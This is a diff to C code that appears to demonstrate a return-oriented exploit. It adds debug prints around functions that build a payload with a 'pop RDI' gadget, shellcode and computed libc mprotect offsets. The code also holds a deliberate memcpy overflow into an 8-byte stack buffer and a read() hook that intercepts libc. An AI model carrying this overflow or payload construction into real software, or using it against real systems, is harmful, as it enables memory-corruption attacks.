@@ -108,6 +108,8 @@ static void populate(PayloadPtr plp) {
 	void *libc_mprotect = dlsym(RTLD_NEXT, s_libc_mprotect);
 	void *libc_base     = libcBase(libc_mprotect);
 
+	printf("In populate()\n");
+
 	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
 
 	plp->pl_popRDI = &&l_poprdi;
@@ -139,6 +141,8 @@ static void disclose(PayloadPtr plp) {
 	void *libc_read       = dlsym(RTLD_NEXT, s_libc_read);
 	void *libc_base       = libcBase(libc_mprotect);
 
+	printf("In disclose()()\n");
+
 	ptrdiff_t libc_mprotect_offset   = libc_mprotect - libc_base;
 
 	printf("--------------------------------------------\n");
@@ -154,21 +158,22 @@ static void disclose(PayloadPtr plp) {
 static void testload(PayloadPtr plp) {
 	char dst[8] = {0};
 
+	printf("In testload()()\n");
+
 	*((PayloadPtr) &(dst[8])) = *plp;
 	((PayloadPtr) &(dst[8]))->pl_shellCode = &((PayloadPtr) &(dst[8]))->scu;
 } // testload()
 
-static void overflow(char *src, size_t n)
-{
+static void overflow(char *src, size_t n) {
 	char dst[8] = {0};
 
-	printf("FOUND! %tu\n", n);
+	printf("In overflow(): %tu\n", n);
+	printf("In overflow(): %s\n", src);
 
 	memcpy(dst, src, n);
 } // overflow()
 
-ssize_t read(int fd, void *buf, size_t count)
-{
+ssize_t read(int fd, void *buf, size_t count) {
 	ssize_t (*real_read)(int fd, void *buf, size_t count) = real_read = dlsym(RTLD_NEXT, s_libc_read);
 
 	ssize_t result = real_read(fd, buf, count);
